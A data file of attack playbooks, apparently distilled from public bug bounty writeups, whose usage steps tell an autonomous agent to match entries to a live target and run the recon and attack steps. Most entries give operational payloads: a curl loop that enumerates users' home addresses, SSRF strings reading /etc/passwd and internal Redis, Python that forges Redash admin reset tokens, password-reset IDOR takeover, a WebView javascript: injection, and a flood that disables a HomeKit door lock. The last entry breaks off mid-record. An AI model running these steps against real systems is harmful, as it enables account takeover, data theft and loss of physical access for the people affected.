description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: AC in /reports/posts.php Leaking PII

trigger_conditions.when_to_apply: When the /reports/posts.php endpoint accepts a POST parameter named 'scheme' and returns user residential addresses.
prerequisites: Attacker must have an authenticated session.
applicability_signals: The endpoint /reports/posts.php exists.
The endpoint accepts POST requests.
The endpoint accepts a 'scheme' parameter.
skip_if: The 'scheme' parameter is not accepted or does not lead to PII disclosure.

recon_steps: Step 1: Browse to https://<TARGET_URL>/reports/posts.php and observe POST parameters and responses.
Step 2: Identify the 'scheme' parameter and confirm it returns user residential addresses.
attack_steps: Step 1: Iterate through a range of numeric IDs (e.g., 1 to 50) for the 'scheme' parameter.
Step 2: Send POST requests to https://<TARGET_URL>/reports/posts.php with the 'scheme[]' parameter set to the current ID.
Step 3: Observe the response for user residential addresses associated with each ID.
payloads_or_patterns: for id in $( seq 1 50 ) ; do curl <TARGET_URL>/reports/posts.php -X POST -d 'scheme%5B%5D= $id &custom=&create=Posts' --silent | sed '1,2d' ; done
tools_recommended: curl: for sending crafted HTTP requests.
Burp Suite: to intercept and modify requests, and observe responses.
success_indicators: Receiving different users' residential addresses in the response body for different 'scheme' parameter values.
HTTP response with 200 OK status code and visible PII.
failure_indicators: Responses with generic error messages or no PII for all tested IDs, indicating the parameter does not function as described or is rate-limited.
403 Forbidden or other access errors, suggesting insufficient privileges.

playbooks.impact: An attacker can enumerate and retrieve residential addresses of multiple users by iterating through numeric IDs, leading to privacy violations and potential for targeted attacks.
playbooks.key_lesson: When an endpoint accepts a parameter that returns user data, test for IDOR by iterating through different numeric and potentially sequential values of that parameter.

meta.title: RCE In Adobe Acrobat Reader For Android(CVE-2021-40724)

tech_stack_fingerprints: Uses Google Play Core library for dynamic code loading

trigger_conditions.when_to_apply: When the Adobe Acrobat Reader app for Android is installed on a target device and can be triggered to open a PDF from a malicious HTTP/HTTPS URL.
prerequisites: The target user must be tricked into opening a specially crafted PDF URL using the Adobe Acrobat Reader app.
applicability_signals: The Adobe Acrobat Reader app has an `intent-filter` that accepts `http` and `https` schemes with `application/pdf` MIME type.
The app downloads PDF files from URLs.
The app uses Google Play Core library for dynamic code loading.
skip_if: The target device does not have Adobe Acrobat Reader installed.
The app's handling of URI schemes has been patched to properly sanitize URL components before file path creation.

recon_steps: Identify if Adobe Acrobat Reader for Android is installed on target devices.
Analyze the app's manifest file for exported activities and intent filters related to opening external files via HTTP/HTTPS.
attack_steps: Step 1: Craft a malicious PDF URL that includes a path traversal sequence in the last path segment, such as `https://<attacker-controlled-server>/malicious.pdf?../<path-to-writable-location>/payload.pdf`.
Step 2: Trigger the target user to open this URL using the Adobe Acrobat Reader app (e.g., via a phishing email or message).
Step 3: The app will attempt to download the file. The path traversal in the URL will cause the download to write the file to an arbitrary location on the device.

Step 4: If the arbitrary location is a place where dynamically loaded code can be executed (e.g., a location that gets loaded by the Google Play Core library or another vulnerable component), the attacker can achieve RCE.
payloads_or_patterns: The specific payload would depend on the RCE mechanism achieved through dynamic code loading. This could involve a malicious DEX file or other executable code.
tools_recommended: Burp Suite: To host the malicious PDF and capture any callbacks.
Android Debug Bridge (adb): For potential post-exploitation analysis or verification if device access is possible.
success_indicators: A reverse shell connection from the target device.
Execution of arbitrary commands on the target device.
Unexpected files appearing in unexpected locations on the device.
failure_indicators: The app displays an error message indicating an invalid URL or file type.
The file is downloaded to the expected directory (`/sdcard/Downloads/Adobe Acrobat/`) without any path traversal issues.
No reverse shell or command execution is observed after triggering the URL.

playbooks.impact: Remote Code Execution (RCE) on the target Android device, allowing the attacker to run arbitrary code with the privileges of the Adobe Acrobat Reader application.
playbooks.key_lesson: Always sanitize URL components, especially the last path segment, before using them to construct file paths, as path traversal vulnerabilities can lead to critical security issues like RCE when combined with other features like dynamic code loading.

meta.title: Exploiting URL Parsers: The Good, Bad, And Inconsistent

affected_components: URL parsing functions in various languages/libraries
tech_stack_fingerprints: Presence of functionality that accepts and parses URLs as input (e.g., fetching external resources, redirection services, API gateways)

trigger_conditions.when_to_apply: When a target application parses URLs provided by the user, especially when these URLs are used for fetching external resources or performing redirects.
prerequisites: The target must accept URLs as input from an attacker-controlled source.
applicability_signals: Endpoints that accept URLs for fetching content (e.g., image uploads from URL, webhooks, preview services).
Redirection endpoints that use user-provided URLs.
APIs that interact with external URLs (e.g., fetching metadata, generating PDFs from URLs).
skip_if: Strict input validation that sanitizes or rejects all non-whitelisted URL schemes or hostnames.
A Web Application Firewall (WAF) that effectively blocks common SSRF payloads.

recon_steps: Identify endpoints that accept URL inputs.
Analyze how the target parses and utilizes these URLs (e.g., fetching content, redirecting, API calls).
attack_steps: Step 1: Attempt to use different URL schemes to bypass parsing logic (e.g., `file://`, `gopher://`, `dict://`, `ldap://`).
Step 2: Craft URLs with unusual characters or encoding to confuse the parser (e.g., `@` for username, `#` for fragments, percent-encoding variations).
Step 3: Test for SSRF by pointing the URL to internal IP addresses or localhost.
Step 4: Utilize specialized payloads like `file:///etc/passwd` or `gopher://localhost:6379/` to check for specific service interactions.
Step 5: If the parser is lenient, attempt to include credentials or sensitive information in the URL.
tools_recommended: Burp Suite (Repeater, Intruder for fuzzing URL components)
Project Discovery nuclei (for automated scanning of URL parsing vulnerabilities)
A custom listener service (e.g., using Python/Flask or ngrok) to receive callbacks for blind SSRF.
success_indicators: Receiving content from internal resources (e.g., `/etc/passwd` content, internal API responses).
Receiving a callback on an attacker-controlled server (e.g., HTTP request to an attacker's IP or a Burp Collaborator/Interactsh address).
Unexpected error messages or behavior indicating interaction with unexpected internal services.
Successful redirection to a malicious site or an internal endpoint.
failure_indicators: Consistent 400 or 403 errors for all tested URL schemes or IP addresses.
The target URL is always sanitized to a safe default or rejected.
No callbacks are received, and no internal content is revealed.

playbooks.impact: Allows an attacker to read arbitrary files from the server (e.g., `/etc/passwd`), interact with internal services (e.g., databases, caches, other internal APIs), and potentially bypass network restrictions to access sensitive data or execute commands on the server.
playbooks.key_lesson: Always test URL parsing functions with a variety of schemes, unusual characters, and internal IP addresses to uncover SSRF vulnerabilities.

meta.title: Pre-Auth RCE in Moodle Part II - Session Hijack in Moodle's Shibboleth

trigger_conditions.when_to_apply: This technique applies when Moodle is configured to use the database session handler and the Shibboleth authentication plugin is enabled.
prerequisites: Moodle is configured to use the database session handler.
Shibboleth authentication plugin is enabled.
applicability_signals: Access to `/auth/shibboleth/logout.php` endpoint.
Presence of `sessdata` and `userid` columns in the `sessions` table.
The `session_decode` function is used to process session data.
skip_if: Moodle is configured to use the file session handler.
Shibboleth authentication plugin is not enabled.

recon_steps: Step 1: Verify Moodle version and Shibboleth plugin presence.
Step 2: Check Moodle's session handler configuration (e.g., `config.php`). Look for `session_handler_class` set to `\core\session\database`.
attack_steps: Step 1: Send a POST request to `/auth/shibboleth/logout.php` with a valid `spsessionid` parameter (can be any value, as the vulnerability lies in session decoding).
Step 2: Observe the response. The core of the attack relies on the side effect of `session_decode` leaving the attacker's session populated with the last decoded session data.
Step 3: After the logout request, attempt to access a user-specific resource on the Moodle instance. If successful, the attacker will be authenticated as the user whose session was last decoded.
Step 4: If the hijacked session belongs to an administrator, leverage this to achieve RCE (e.g., by using the plugin installer).
Step 5: If the hijacked session is not privileged, use Moodle's ordinary logout functionality to remove the hijacked session from the database and repeat the attack to find an admin session.
payloads_or_patterns:
POST /auth/shibboleth/logout.php HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded

spsessionid=some_value
tools_recommended: Burp Suite: To intercept and modify requests to `/auth/shibboleth/logout.php` and to probe for user-specific content after the session hijack.
success_indicators: The attacker is able to access resources or perform actions as another logged-in user after sending the logout request.
If an admin session is hijacked, the attacker can gain RCE.
failure_indicators: The session handler is not configured for database sessions.
The Shibboleth plugin is not enabled.
The logout request does not result in session hijacking (e.g., `session_decode` is not being used in a vulnerable manner).

playbooks.impact: An unauthenticated attacker can hijack any user's session if Shibboleth authentication is enabled. If an active admin session is hijacked, the attacker can achieve Remote Code Execution (RCE) on the Moodle instance.
playbooks.key_lesson: Avoid re-implementing or directly manipulating PHP's internal session mechanisms, as it can lead to complex and dangerous vulnerabilities. Rely on built-in, secure session management features.

meta.title: New macOS vulnerability, “powerdir,” could lead to unauthorized user data access

trigger_conditions.when_to_apply: This vulnerability is applicable when the target macOS system is unpatched against CVE-2021-30970 and an attacker can execute code on the system to manipulate the home directory.
prerequisites: Target macOS system is running an unpatched version against CVE-2021-30970.
Attacker has the ability to execute code on the target macOS system.
applicability_signals: The writeup mentions the vulnerability CVE-2021-30970 and the TCC technology.
skip_if: The target macOS system has been patched with Apple's security updates released on December 13, 2021.

recon_steps: Step 1: Identify the macOS version and check if it is updated to the December 13, 2021 security patch level or later.
Step 2: Confirm if an attacker can achieve code execution on the target system.
attack_steps: Step 1: Execute malicious code on the target macOS system.
Step 2: Programmatically change the target user's home directory path.
Step 3: Plant a fake TCC database in the manipulated home directory.
Step 4: Attempt to access protected user data that the malicious application would normally not have access to.
payloads_or_patterns: The writeup describes the mechanism but does not provide specific code or command payloads for changing the home directory or planting a fake TCC database.
tools_recommended: Insufficient detail in writeup
success_indicators: Gaining unauthorized access to a user's protected data (e.g., camera, microphone, location, calendar, iCloud account).
Bypassing TCC restrictions for an application.
failure_indicators: Unable to modify the home directory path or plant a fake TCC database.
TCC restrictions remain in place, preventing access to protected data.
System reports errors related to file system access or TCC configuration.

playbooks.impact: An attacker can bypass macOS's Transparency, Consent, and Control (TCC) technology, leading to unauthorized access to sensitive user data such as camera, microphone, location, calendar, and iCloud account information.
playbooks.key_lesson: Always verify if macOS systems are patched against known vulnerabilities like CVE-2021-30970 (powerdir) that allow TCC bypass and unauthorized data access.

meta.title: Exploiting Redash instances with CVE-2021-41192

affected_components: Session management (due to predictable secret key)

trigger_conditions.when_to_apply: This vulnerability applies when a Redash instance is running with a default or predictable `SECRET_KEY` that is accessible to the attacker, often due to a misconfiguration where the `SECRET_KEY` is not explicitly set.
prerequisites: The target Redash instance must be accessible from the internet.

The target Redash instance must be using a predictable or leaked `SECRET_KEY`. This can be identified by the Flask-Unsign tool or by inspecting older versions of Redash that may have a static default key.
applicability_signals: Flask-Unsign successfully signs or unsigns a cookie from the target application.
The Redash source code reveals a static default `SECRET_KEY` or a fallback mechanism that allows for predictable keys.
The password reset functionality generates tokens using `itsdangerous.URLSafeTimedSerializer` with the same `SECRET_KEY`.
skip_if: The `SECRET_KEY` is strong, randomly generated, and not exposed.
The Redash instance uses a modern version that does not send session cookies until after successful login (making cookie-based discovery difficult).

recon_steps: Step 1: Scan publicly accessible Redash instances using tools like Nmap or by searching for the Redash login page URL pattern. Target instances that appear to be self-hosted.

Step 2: For identified Redash instances, attempt to retrieve their session cookies. If the instance is vulnerable, Flask-Unsign can be used to identify if the `SECRET_KEY` is predictable or leaked. Alternatively, inspect the source code for hardcoded or default secret keys, especially in older versions.

Step 3: If a predictable `SECRET_KEY` is found, verify if the password reset token generation uses the same key by inspecting the Redash source code for `itsdangerous.URLSafeTimedSerializer` usage with user IDs.
attack_steps: Step 1: Obtain the predictable `SECRET_KEY` for the target Redash instance.

Step 2: Generate a password reset token for the administrator user (typically user ID '1') using the obtained `SECRET_KEY` and the `itsdangerous.URLSafeTimedSerializer`. The payload for `dumps` should be the string representation of the user ID (e.g., '1').
Step 3: Construct the password reset URL by appending the generated token to the `/reset/` endpoint (e.g., <TARGET_URL>/reset/<GENERATED_TOKEN>).
Step 4: Visit the constructed password reset URL.
Step 5: If the instance is vulnerable, a form to set a new password will be displayed. Submit a new password to gain administrator access.
payloads_or_patterns:
Python snippet to generate token: 
```python
from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = "<OBTAINED_SECRET_KEY>"
serializer = URLSafeTimedSerializer(SECRET_KEY)
password_reset_token = serializer.dumps(str("1")) # For user ID 1
print(f"Password reset token: {password_reset_token}")
```
Example token format: `IjEi.YdEknw.htZVzELmilJCgsSYu1oMXXEVhWY` (where `IjEi.YdEknw.htZVzELmilJCgsSYu1oMXXEVhWY` is the generated token)
tools_recommended: Flask-Unsign: To discover predictable or leaked secret keys from session cookies.
Python with `itsdangerous` library: To generate password reset tokens.
Burp Suite/OWASP ZAP: To intercept requests, modify URLs, and test password reset functionality.
success_indicators: The password reset page for user ID '1' loads and prompts for a new password when visiting the constructed URL.
Successfully setting a new password and logging into the Redash instance as an administrator.
failure_indicators: The password reset link is reported as invalid or expired. This indicates the `SECRET_KEY` is not the one used for token generation, or the token generation logic differs.
The target Redash instance returns a 404 or other error page indicating the reset path does not exist or is not vulnerable.
The Flask-Unsign tool fails to identify any predictable `SECRET_KEY` from cookies.

playbooks.impact: Full administrator access to the Redash instance, allowing an attacker to view, query, and potentially modify any data sources connected to Redash, access sensitive internal information, and execute arbitrary code if further vulnerabilities are present within the instance or connected data sources.
playbooks.key_lesson: Always investigate applications that handle sensitive data by checking for predictable or leaked secret keys, as these can often lead to authentication bypasses or privilege escalation via functionalities like password resets that rely on the same key.

meta.title: Full Account Takeover of ANY user via Insecure Direct Object Reference (IDOR) on reset password functionality

tech_stack_fingerprints: Response HTML contains <input type="hidden" name="id" value="<numeric_id>">

trigger_conditions.when_to_apply: When the password reset functionality for a user exposes incremental numeric identifiers that can be manipulated to access or modify another user's account data.
prerequisites: Attacker must have an authenticated account on the target application.
Target application must use incremental numeric IDs for users, exposed in password reset links or POST requests.
Password reset functionality must not adequately validate ownership of the account during the reset process.
applicability_signals: Discovery of incremental numeric IDs in password reset URLs (e.g., `https://<target>.com/reset-password/0-57-axq24ncy32bh1hc8nrp78xyz`).
Presence of a hidden input field named 'id' with a numeric value in the HTML source of password reset related pages.
Password reset POST requests contain a parameter named 'id' with a numeric value.
skip_if: Password reset requests require re-authentication or a user-specific, non-guessable token that is not passed in the POST body.
The 'id' parameter is not present in the password reset POST request, or is replaced by a GUID/UUID.
All attempts to change the 'id' parameter result in an error or are blocked by WAF.

recon_steps: Step 1: Register two or more user accounts on the target application.
Step 2: Initiate the password reset process for the first (attacker) account and observe the generated reset URL. Note the numeric ID within the URL.
Step 3: Initiate the password reset process for the second (victim) account and observe the generated reset URL. Note the numeric ID and confirm it is incremental.
attack_steps: Step 1: Use a proxy (e.g., Burp Suite) to capture the password reset POST request for the attacker's account.
Step 2: Modify the `id` parameter in the captured POST request to the ID of the victim account.
Step 3: Submit the modified POST request with a new desired password for the victim account.
Step 4: Attempt to log in to the victim account using the newly set password.
tools_recommended: Burp Suite Professional: To intercept and modify HTTP requests, specifically the password reset POST request.
Burp Intruder (optional): For brute-forcing incremental IDs if the victim ID is not immediately known.
success_indicators: The application responds with a success message indicating the password has been changed.
The attacker can successfully log in to the victim's account using the new password.
The victim user is locked out of their account or cannot log in with their original password.
failure_indicators: The application returns an error like 'Invalid ID', 'User not found', or 'Access Denied' after modifying the ID.
The password change request is rejected, and the victim's password remains unchanged.
Forwarding the modified request results in a 403 Forbidden or similar access control error. Pivot: Try fuzzing the ID parameter with a wider range or using different character sets if applicable.

playbooks.impact: Full account takeover of any registered user, allowing the attacker to access sensitive information, perform actions on behalf of the user, and potentially escalate privileges within the application. This can lead to complete compromise of user accounts.
playbooks.key_lesson: Always validate that the authenticated user making a request to reset or modify account details is the legitimate owner of that account, rather than relying solely on identifiers present in the request.

meta.title: Facebook android webview vulnerability : Execute arbitrary javascript (xss) and load arbitrary website

tech_stack_fingerprints: Facebook Work app package name: com.facebook.work

trigger_conditions.when_to_apply: When the Facebook Android app has an exported activity that uses a WebView and loads URLs from intent extras without proper validation of the URL scheme.
prerequisites: The target Android device must have a vulnerable version of the Facebook app installed (e.g., 338.1.0.36.118).
applicability_signals: The presence of an exported activity in the Facebook app that accepts an Intent extra named 'CHECKOUTURL'.
Observing that this 'CHECKOUTURL' is loaded into a WebView.
skip_if: The Facebook app version is known to be patched and validates the URL scheme to be http/https and specific host/path.

recon_steps: Analyze the decompiled code of the Facebook Android app to identify exported activities that handle Intents and use WebViews.
Specifically look for activities that accept Intent extras and use them to construct URLs for WebView loading, paying attention to any 'CHECKOUTURL' or similar parameters.
attack_steps: Step 1: Construct an Intent to launch the vulnerable `com.facebook.katana.activity.iap.LaunchFromIAP` activity.
Step 2: Include a malicious `javascript:` URL as the value for the `CHECKOUTURL` extra.
Step 3: Execute the Intent on an Android device with the vulnerable Facebook app installed.
Step 4: Observe if the JavaScript payload executes within the WebView context.
payloads_or_patterns: Payload 3: `https://evil.com` (to demonstrate loading an arbitrary website)
tools_recommended: Android Debug Bridge (adb) for executing Intents.
Decompilation tools (e.g., JADX, Apktool) for static analysis of the APK.
success_indicators: An `alert()` box displaying `document.domain` or `document.cookie` within the WebView.
Successful loading of an arbitrary website (e.g., `https://evil.com`) in the WebView, indicating potential for phishing or further exploitation.
failure_indicators: The WebView loads a default Facebook page or a safe error page instead of executing the JavaScript or loading the arbitrary website.
The app crashes when the malicious Intent is launched.
A `SecurityException` is thrown if the activity is not truly exported or if permissions are missing.

playbooks.impact: An attacker can execute arbitrary JavaScript within the context of the Facebook Android app's WebView. This can lead to Cross-Site Scripting (XSS) attacks, allowing attackers to steal user session cookies, perform actions on behalf of the user, or display phishing content to trick users into revealing sensitive information.
playbooks.key_lesson: Always validate URL schemes (e.g., disallow `javascript:`) and strictly enforce allowed hosts and paths when loading external URLs into WebViews, especially within sensitive applications like social media clients.

meta.title: The Story Of How I Bypass SSO Login

tech_stack_fingerprints: Briefly visible content behind SSO login

trigger_conditions.when_to_apply: When a web application requires SSO login but briefly exposes content before the SSO prompt appears.
prerequisites: The target application uses an SSO login mechanism.
applicability_signals: A brief flash of the underlying page content before the SSO login page is fully rendered.
Interceptable HTTP responses for the SSO login page.
skip_if: The application does not use SSO.
No content is ever visible before the SSO login prompt.
The SSO login page cannot be intercepted or manipulated.

recon_steps: Step 1: Use Burp Suite to intercept traffic to the target application.
Step 2: Navigate to the login page to trigger the SSO flow and observe the behavior.
attack_steps: Step 1: Observe that the application requires SSO login.
Step 2: Note that for a brief moment, content behind the SSO login page is visible.
Step 3: Attempt to change HTTP methods (GET, POST, TRACE) on the SSO login request. (This did not work in the writeup)
Step 4: Navigate to another reachable page within the application that returns a 200 OK response.
Step 5: Copy the entire HTTP response of the reachable page.
Step 6: Intercept the HTTP response for the SSO login page.
Step 7: Replace the content of the intercepted SSO login response with the copied response from the reachable page.
Step 8: Forward the modified request.
payloads_or_patterns: Intercept and modify the raw HTTP response of the SSO login page by replacing its content with a valid, reachable page's response.
tools_recommended: Burp Suite: Intercepting proxy and repeater functionality.
success_indicators: The SSO login is bypassed, and the attacker can access pages they should not have access to without proper authentication.
The application renders content normally, bypassing the SSO requirement.
failure_indicators: The application returns an error or a different response, indicating the modification was detected or ineffective.
The SSO login page continues to be displayed.
The modified response leads to a broken page or application error.

playbooks.impact: Bypass of Single Sign-On (SSO) authentication, granting unauthorized access to internal application pages and functionalities that should be protected.
playbooks.key_lesson: When an application briefly flashes content behind an authentication mechanism, investigate response manipulation by replacing the authentication response with a valid, non-authenticated response from another part of the application.

meta.title: doorLock: Apple HomeKit Denial of Service

trigger_conditions.when_to_apply: When a HomeKit door lock accessory is accessible over the local network and can be controlled via the HomeKit protocol.
prerequisites: Attacker is on the same local network as the target HomeKit accessory.
Target HomeKit door lock accessory is powered on and discoverable.
applicability_signals: Existence of a HomeKit-enabled door lock accessory on the network.
skip_if: HomeKit accessories are behind a firewall blocking local network communication.
The door lock accessory does not support the necessary HomeKit services for locking/unlocking.

recon_steps: Step 1: Scan the local network for active HomeKit devices using network scanning tools or HomeKit discovery protocols.
attack_steps: Step 1: Identify the target door lock accessory's HomeKit services and characteristics.
Step 2: Send a continuous stream of unlock commands to the door lock accessory.
Step 3: Monitor the door lock accessory's responsiveness. If it stops responding to legitimate lock/unlock commands or becomes unavailable, a DoS has been achieved.
payloads_or_patterns: HomeKit Characteristic write request for 'Lock Target State' with value 0 (unlock)
tools_recommended: Homebridge or custom scripts utilizing HomeKit libraries (e.g., HAP-NodeJS) to send commands.
success_indicators: The door lock accessory becomes unresponsive to subsequent legitimate lock/unlock commands.
The door lock accessory disconnects from the HomeKit network or ceases advertising its services.
failure_indicators: The door lock accessory continues to respond normally to all commands, even under heavy load (e.g., returns success status for each command). → Attempt should be stopped.
No observable impact on the accessory's availability. → Technique may not be effective on this specific model.

playbooks.impact: The door lock accessory becomes unusable, preventing authorized users from locking or unlocking the door, leading to a denial of service for physical access.
playbooks.key_lesson: When interacting with IoT devices via proprietary protocols like HomeKit, continuously sending state-changing commands can lead to denial of service by overwhelming the device's processing capabilities.

meta.title: Fixing the Unfixable: Story of a Google Cloud SSRF

trigger_conditions.when_to_apply: When an application exposes a proxy endpoint that accepts a URL as a parameter and has a whitelist of allowed domains or URLs for proxying.
prerequisites: The target application must have an interactive demo or feature that proxies requests to external services.
applicability_signals: The presence of a `/proxy` endpoint in the URL.
The `url` parameter in the request to the `/proxy` endpoint.
Observation of requests being proxied to a known API (e.g., jobs.googleapis.com).
skip_if: The proxy endpoint strictly enforces IP whitelisting for outgoing requests.
The proxy endpoint does not allow any external URLs to be proxied.

recon_steps: Step 1: Identify interactive demos or features on Google Cloud product pages.
Step 2: Analyze HTTP requests made by these demos to understand how data is fetched and identify any proxy endpoints.
Step 3: Observe the `url` parameter in the proxy requests to determine if it's possible to control the destination of the proxied request.
attack_steps: Step 1: Send a GET request to the identified proxy endpoint with the `url` parameter set to a controllable external URL (e.g., attacker's VPS).
Step 2: If direct external URLs are blocked, analyze the observed whitelist behavior and attempt to proxy to allowed domains but with different paths or subdomains.
Step 3: Attempt to proxy to internal Google Cloud endpoints or metadata services if the whitelist is broad enough.
payloads_or_patterns:
GET /proxy?url=<ATTACKER_CONTROLLED_URL> HTTP/1.1
Host: cxl-services.appspot.com

GET /proxy?url=https://jobs.googleapis.com/ HTTP/1.1
Host: cxl-services.appspot.com
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially the `url` parameter.
A simple HTTP server on a VPS: To receive incoming requests from the proxied SSRF.
success_indicators: Receiving an HTTP request from `cxl-services.appspot.com` on the attacker's controlled server.
The response from the proxy endpoint contains data from an unintended URL.
The proxy endpoint successfully retrieves information from Google's internal services or metadata endpoints.
failure_indicators: The proxy endpoint returns an error indicating an invalid URL or a blocked domain.
No incoming requests are received on the attacker's VPS when a controllable URL is used.
The proxy endpoint only allows requests to specific, non-publicly accessible URLs.

playbooks.impact: An attacker can potentially read sensitive data from internal Google Cloud services, access metadata endpoints, or interact with other internal APIs by leveraging the proxy to bypass network restrictions and security controls.
playbooks.key_lesson: Always scrutinize proxy endpoints for SSRF vulnerabilities, paying close attention to URL whitelisting mechanisms and attempting to bypass them by testing subdomain traversal, different ports, or even protocol variations.

meta.title: Bypassing Identity-Aware Proxy - Google Cloud Vulnerability

trigger_conditions.when_to_apply: When an attacker can set up a second IAP-secured web application using the same OAuth client ID as a target application, and can configure an External HTTPS Load Balancer with query parameter-based routing.
prerequisites: Attacker can create and configure an IAP-secured web application.
Attacker can configure an External HTTPS Load Balancer.
Attacker can share an OAuth client ID between two IAP applications.
applicability_signals: Target application uses Google Cloud Identity-Aware Proxy.
Target application is accessible via an External HTTPS Load Balancer.
The writeup describes query parameter-based routing as a feature of the load balancer.
skip_if: The target application does not use IAP.
The attacker cannot share OAuth client IDs.
The load balancer does not support query parameter-based routing.

recon_steps: Step 1: Identify IAP-secured web applications and their OAuth client IDs.
Step 2: Verify if the External HTTPS Load Balancer supports query parameter-based routing and if OAuth client ID sharing is possible for the target.
attack_steps: Step 1: Create a second IAP-secured web application using the same OAuth client ID as the targeted application.
Step 2: Configure the External HTTPS Load Balancer for the attacker's application to utilize query parameter-based routing.
Step 3: Route requests with the query parameter gcp-iap-mode=AUTHENTICATING to a backend service that does NOT have IAP enabled.
Step 4: Induce a user authorized for the targeted application to access the attacker's IAP-secured app.
Step 5: Capture the redirect_token from the requests sent to the attacker's backend service.
Step 6: Use the captured redirect_token to access the targeted IAP-secured web application.
tools_recommended: Google Cloud Console: for creating and configuring IAP applications and Load Balancers.
Burp Suite: to intercept and analyze requests, capture redirect tokens.
success_indicators: Successful capture of a valid redirect_token for the targeted application.
Ability to access the targeted IAP-secured web application using the captured redirect_token.
The user's authentication and authorization are bypassed for the target application.
failure_indicators: Unable to configure query parameter-based routing on the Load Balancer (suggests alternative routing methods or a different vulnerability).
No redirect_token is generated or the token is invalid (suggests misconfiguration or a different IAP flow).
403 Forbidden when attempting to use the captured token (suggests token is expired or tied to specific session context not captured).

playbooks.impact: An attacker can hijack sessions of authorized users and gain unauthorized access to IAP-secured web applications, bypassing the intended authorization controls.
playbooks.key_lesson: When dealing with IAP-secured applications, investigate the configuration of shared OAuth client IDs and Load Balancer routing rules for potential token leakage vulnerabilities.

meta.title: WhatsApp for Android Retains Deleted Contacts Locally

trigger_conditions.when_to_apply: When an attacker has physical access to a WhatsApp for Android device and the 'security code change notifications' option is enabled.
prerequisites: Attacker has physical access to the target's Android device.
The 'security code change notifications' option is enabled in WhatsApp settings.
The target has previously had chats with contacts who subsequently had security code changes.
applicability_signals: The target uses WhatsApp for Android.
The 'security code change notifications' setting is enabled in WhatsApp.
The device's owner has previously deleted contacts and chats.
skip_if: The 'security code change notifications' option is disabled.
The attacker does not have physical access to the device.
The 'Clear Chat' option was always used before deleting chats and contacts.

recon_steps: Step 1: On the target Android device, navigate to WhatsApp settings to verify if 'Security code change notifications' is enabled.
Step 2: Browse the device's Android Contacts app to identify existing contacts.
attack_steps: Step 1: If a deleted contact is suspected, re-add the contact to the device via the Android Contacts app.
Step 2: Start a new chat with the re-added contact in WhatsApp (no messages need to be sent).
Step 3: Observe the chat window for any 'security code changes' listed with dates. These indicate past interactions with that contact, even if the chat was deleted.

Step 4: To confirm the behavior, select 'Clear Chat' for the contact, then delete the contact and re-add it. Repeat steps 2-3. If the security code changes no longer appear, it confirms the vulnerability.
tools_recommended: Android device with WhatsApp installed
Device's Contacts app
WhatsApp application
success_indicators: Display of 'security code changes' with dates in a new chat with a previously deleted contact.
The presence of historical security code change notifications for contacts that have been deleted from both WhatsApp and the Android Contacts app.
failure_indicators: No 'security code changes' appear in the chat with a re-added contact, even after following the steps. This might indicate the 'Clear Chat' option was always used, or the feature is disabled.
The 'security code change notifications' option is not enabled in WhatsApp settings.

playbooks.impact: An attacker with physical access to a WhatsApp user's device can recover information about past interactions with deleted contacts by observing retained security code change notifications. This allows the attacker to infer who the user previously communicated with, even after they attempted to remove those contacts and chats, posing a privacy risk.
playbooks.key_lesson: When an attacker has physical access to a mobile device, always investigate if sensitive information related to deleted contacts or communications is retained locally, especially within messaging applications.

meta.title: [IDOR] add or remove the linked publications from Author Publisher settings

trigger_conditions.when_to_apply: When a user needs to manage their linked publications (e.g., associate their profile with a news outlet's Facebook page) and the backend does not properly validate the ownership of the author_id and publisher_id in the request.
prerequisites: Attacker must have a Facebook account.
Target user must have interacted with the 'Linked Publications' feature at some point.
Attacker needs to know or be able to guess the victim's author_id (Facebook profile ID) and a publisher_id (Facebook page ID of a publication).
applicability_signals: The presence of a settings page for 'Linked Publications' or 'Author Publisher' settings.
Observing GraphQL requests related to managing these linked publications.
skip_if: The 'Linked Publications' feature is completely removed and no longer functional.
All requests to modify linked publications are strictly validated and reject unauthorized changes.

recon_steps: Step 1: Identify the Facebook settings page related to 'Linked Publications' or 'Author Publisher'.
Step 2: Use browser developer tools to intercept network requests when adding or removing linked publications. Look for GraphQL requests.
Step 3: Analyze the structure of the GraphQL requests to identify parameters like 'author_id' and 'publisher_id'.
attack_steps: Step 1: As an authenticated attacker, craft a GraphQL request to add a publication to a victim's account.
Step 2: Set the 'author_id' parameter to the victim's Facebook profile ID and the 'publisher_id' to the Facebook page ID of a publication the attacker wants to associate with the victim.
Step 3: Send the crafted request using a valid first-party access token (e.g., from the Android app).
Step 4: Craft a similar GraphQL request to remove a publication from the victim's account, again using the victim's author_id and the target publisher_id.
payloads_or_patterns: GraphQL request to ADD: mutation { update_author_publisher_settings(input: { author_id: "<VICTIM_USER_ID>", publisher_id: "<PUBLICATION_PAGE_ID>", add_publication: true }) { success }}
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify GraphQL requests.
Facebook Graph API Explorer: To understand and construct valid GraphQL queries if needed.
success_indicators: The victim's 'Linked Publications' settings now show the publication associated with their profile (for add), or the publication is removed (for remove).
The attacker can observe the change reflected in the victim's profile or settings page.
failure_indicators: Receiving an error response (e.g., 400 Bad Request, 403 Forbidden) with messages indicating insufficient permissions or invalid parameters. -> If permissions are the issue, attempt to find a publisher_id that is less restricted or try different attack vectors on the target Facebook feature.

playbooks.impact: An attacker can impersonate a journalist or author by linking publications to their profile without their consent, or disrupt a journalist's credibility by removing legitimate publications from their profile settings.
playbooks.key_lesson: Always validate that the authenticated user making a request to modify settings or associations is the legitimate owner of the affected object (e.g., author_id) and not just a user with valid session tokens.

meta.title: Remote Code Execution in Google Cloud Dataflow

trigger_conditions.when_to_apply: This exploit is applicable when a Java JMX service is exposed to the internet on Google Cloud Dataflow worker nodes, allowing unauthenticated access.
prerequisites: Dataflow job must be launched.
Worker nodes must be running a Java JMX service.
applicability_signals: Worker nodes accessible from the internet.
Listening JMX ports (e.g., 9010, 7010, 8010, 1099) found on worker nodes.
